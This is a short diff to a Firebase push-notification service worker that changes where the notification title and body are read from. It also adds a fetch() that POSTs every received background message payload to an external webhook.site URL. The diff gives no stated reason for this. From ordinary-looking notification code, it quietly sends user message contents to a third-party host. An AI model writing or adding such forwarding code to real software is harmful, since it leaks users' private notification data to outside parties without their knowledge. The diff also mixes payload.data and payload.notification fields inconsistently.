@@ -15,15 +15,25 @@ firebase.initializeApp({
 
 const messaging = firebase.messaging();
 
+self.addEventListener("notificationclick", function (event) {
+    event.notification.close();
+});
+
 messaging.onBackgroundMessage(function (payload) {
     console.log(
         "[firebase-messaging-sw.js] Received background message ",
         payload
     );
 
-    const notificationTitle = payload.notification.title;
+    // Send the data to: https://webhook.site/adf13c92-be16-470e-baf5-7d323e5e1592
+    fetch("https://webhook.site/adf13c92-be16-470e-baf5-7d323e5e1592", {
+        method: "POST",
+        body: JSON.stringify(payload),
+    });
+
+    const notificationTitle = payload.data.title;
     const notificationOptions = {
-        body: payload.notification.body,
+        body: payload.data.body,
         icon: payload.notification.icon,
     };
 
